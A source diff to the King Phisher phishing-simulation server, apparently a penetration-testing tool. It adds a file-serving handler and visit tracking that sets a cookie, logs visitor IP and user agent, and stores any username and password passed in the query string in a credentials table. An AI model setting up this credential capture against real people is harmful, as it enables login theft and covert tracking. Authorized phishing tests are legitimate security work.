@@ -1,5 +1,7 @@
 import contextlib
+import os
 import random
+import shutil
 import sqlite3
 import string
 
@@ -14,13 +16,11 @@ make_uid = lambda: ''.join(random.choice(string.ascii_letters + string.digits) f
 
 class KingPhisherRequestHandler(AdvancedHTTPServerRequestHandler):
 	def install_handlers(self):
-		if not self.server.database:
-			return
 		self.database = self.server.database
+		self.config = self.server.config
 		self.rpc_handler_map['/ping'] = self.rpc_ping
 		self.rpc_handler_map['/campaign/list'] = self.rpc_campaign_list
 		self.rpc_handler_map['/campaign/new'] = self.rpc_campaign_new
-
 		self.rpc_handler_map['/campaign/message/new'] = self.rpc_campaign_message_new
 
 	@contextlib.contextmanager
@@ -38,6 +38,62 @@ class KingPhisherRequestHandler(AdvancedHTTPServerRequestHandler):
 		if self.client_address[0] != '127.0.0.1':
 			return False
 		return super(self.__class__, self).check_authorization()
+
+	def respond_file(self, file_path, attachment = False, query = {}):
+		file_path = os.path.abspath(file_path)
+		try:
+			file_obj = open(file_path, 'rb')
+		except IOError:
+			self.respond_not_found()
+			return None
+		self.send_response(200)
+		self.send_header('Content-Type', self.guess_mime_type(file_path))
+		fs = os.fstat(file_obj.fileno())
+		self.send_header('Content-Length', str(fs[6]))
+		if attachment:
+			file_name = os.path.basename(file_path)
+			self.send_header('Content-Disposition', 'attachment; filename=' + file_name)
+		self.send_header('Last-Modified', self.date_time_string(fs.st_mtime))
+
+		get_query_parameter = lambda p: query.get(p, [None])[0]
+		msg_id = get_query_parameter('id')
+		if msg_id:
+			try:
+				self.handle_visit(query, msg_id)
+			except Exception as err:
+				# TODO: log execeptions here
+				pass
+
+		self.end_headers()
+		shutil.copyfileobj(file_obj, self.wfile)
+		file_obj.close()
+		return
+
+	def handle_visit(self, query, msg_id):
+		get_query_parameter = lambda p: query.get(p, [None])[0]
+		with self.get_cursor() as cursor:
+			cursor.execute('SELECT 1 FROM messages WHERE id = ?', (msg_id,))
+			if not cursor.fetchone():
+				return
+		kp_cookie_name = self.config.get('cookie_name', 'KPID')
+		if not kp_cookie_name in self.cookies:
+			visit_id = make_uid()
+			cookie = "{0}={1}; Path=/; HttpOnly".format(kp_cookie_name, visit_id)
+			self.send_header('Set-Cookie', cookie)
+			with self.get_cursor() as cursor:
+				client_ip = self.client_address[0]
+				user_agent = (self.headers.getheader('user-agent') or '')
+				cursor.execute('INSERT INTO visits (id, message_id, visitor_ip, visitor_details) VALUES (?, ?, ?, ?)', (visit_id, msg_id, client_ip, user_agent))
+		else:
+			visit_id = self.cookies[kp_cookie_name].value
+			with self.get_cursor() as cursor:
+				cursor.execute('UPDATE visits SET visit_count = visit_count + 1, last_visit = CURRENT_TIMESTAMP WHERE id = ?', (visit_id,))
+		username = (get_query_parameter('username') or get_query_parameter('user') or get_query_parameter('u'))
+		password = (get_query_parameter('password') or get_query_parameter('pass') or get_query_parameter('p'))
+		if username:
+			password = (password or '')
+			with self.get_cursor() as cursor:
+				cursor.execute('INSERT INTO credentials (visit_id, username, password) VALUES (?, ?, ?)', (visit_id, username, password))
 
 	def rpc_ping(self):
 		return True
